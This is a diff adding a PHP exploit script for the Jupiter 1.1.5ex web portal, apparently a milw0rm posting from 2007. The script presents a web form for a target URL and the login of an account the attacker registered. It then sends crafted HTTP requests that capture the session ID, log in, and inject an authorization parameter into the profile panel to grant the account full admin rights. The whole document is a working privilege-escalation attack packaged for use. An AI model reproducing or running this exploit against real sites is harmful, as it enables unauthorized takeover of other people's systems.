@@ -1,0 +1,122 @@
+<?php
+########################## WwW.BugReport.ir ###########################################
+#
+#      AmnPardaz Security Research & Penetration Testing Group
+#
+# Title: Jupiter 1.1.5ex Privileges Escalation
+# Vendor: http://www.jupiterportal.com
+# original advisory: http://www.bugreport.ir/?/23
+#######################################################################################
+?>
+
+<html dir="ltr">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Jupiter 1.1.5ex Privileges Escalation</title>
+<style type="text/css" media="screen">
+body {
+	font-size: 10px;
+	font-family: verdana;
+}
+INPUT {
+	BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #00ff00; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428
+}
+</style>
+</head>
+<body dir="ltr" alink="#00ff00"  bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
+<form method="POST" action="?">
+Target URL (whit trailing slash) :<BR><BR>
+http://<input type="text" name="target" value="www.example.com/jupiter/" size="50"><BR><BR>
+Username :<BR><BR>
+<input type="text" name="username" size="30"><BR><BR>
+Password :<BR><BR>
+<input type="text" name="password" size="30"><BR><BR>
+*First Create an account on target!<BR>
+The exploit will login with this username and password and then grants full access to this account!<BR><BR>
+<input type="submit" name="start" value="Start">
+</form>
+<?php
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+
+function sendpacket($packet)
+{
+	global $host, $html;
+	$port  = 80;
+	
+	$ock=fsockopen(gethostbyname($host),$port);
+	if ($ock)
+	{
+		fputs($ock,$packet);
+		$html='';
+		while (!feof($ock))
+		{
+			$html.=fgets($ock);
+		}
+		fclose($ock);
+		// echo nl2br(htmlentities($html));
+	}else die('<BR>No response from '.htmlentities($host).'<BR>');
+}
+
+if(isset($_POST['start']))
+{
+	if ($_POST['target'] == '' || $_POST['username'] == '' || $_POST['username'] == '')
+	{
+		die('Error : All fields are required!');
+	}
+	$Target   = trim($_POST['target']);
+	$Username = trim($_POST['username']);
+	$Password = trim($_POST['password']);
+	$Target  .= ($Target[strlen($Target)-1] <> '/') ? '/' : '';
+	$host     = substr($Target, 0 ,strpos($Target, '/'));
+	$path     = substr($Target, strpos($Target, '/'));
+	$Query1   = $path.'index.php';
+	$packet1  = "HEAD $Query1 HTTP/1.1\r\n";
+	$packet1 .= "User-Agent: Shareaza v1.x.x.xx\r\n";
+	$packet1 .= "Host: ".$host."\r\n";
+	$packet1 .= "Connection: Close\r\n\r\n";
+	sendpacket($packet1);
+	echo nl2br(htmlentities($html));
+	$Pattern  = "(PHPSESSID=[a-z0-9]{20,32})";
+	if(preg_match($Pattern, $html, $Matches))
+	{
+		$Match = $Matches[0];
+		$PHPSESSID = substr($Match, 10, strlen($Match));
+	}
+	$Query2   = $path.'index.php?n=modules/login';
+	$packet2  = "POST $Query2&username=$Username&password=$Password&submit=Login&PHPSESSID=$PHPSESSID HTTP/1.1\r\n";
+	$packet2 .= "User-Agent: Shareaza v1.x.x.xx\r\n";
+	$packet2 .= "Host: ".$host."\r\n";
+	$packet2 .= "Connection: Close\r\n\r\n";
+	sendpacket($packet2);
+	if(stristr($html , 'i=1') == true)
+	{
+		die('Error : Incorrect username or password! Try again!');
+	} else
+	if(stristr($html , 'i=5') == true)
+	{
+		die('Error : Someone is currently using that account!');
+	} else
+	$RandMail = substr($PHPSESSID, 10, 6).'_mail@none.com';
+	$Query3   = $path.'index.php?n=modules/panel&a=2&tmp[authorization]=4';
+	$packet3  = "POST $Query3&editpassword=&editpassword2=&editemail=$RandMail&edittemplate=default&editurl=&editflag=none&editday=0&editmonth=0&edityear=0&edithideemail=0&editcalendarbday=0&editmsn=&edityahoo=&editicq=&editaim=&editskype=&editsignature=&editaboutme=&PHPSESSID=$PHPSESSID HTTP/1.1\r\n";
+	$packet3 .= "User-Agent: Shareaza v1.x.x.xx\r\n";
+	$packet3 .= "Host: ".$host."\r\n";
+	$packet3 .= "Connection: Close\r\n\r\n";
+	sendpacket($packet3);
+	if(stristr($html , 'i=26') == false)
+	{
+		die('Exploit Failed');
+	}
+	$Query4   = $path.'index.php?n=modules/login&a=1';
+	$packet4  = "POST $Query4&PHPSESSID=$PHPSESSID HTTP/1.1\r\n";
+	$packet4 .= "User-Agent: Shareaza v1.x.x.xx\r\n";
+	$packet4 .= "Host: ".$host."\r\n";
+	$packet4 .= "Connection: Close\r\n\r\n";
+	sendpacket($packet4);
+	die('Exploit succeeded! You have Full access now!');
+}	
+?>
+
+# milw0rm.com [2007-12-24]
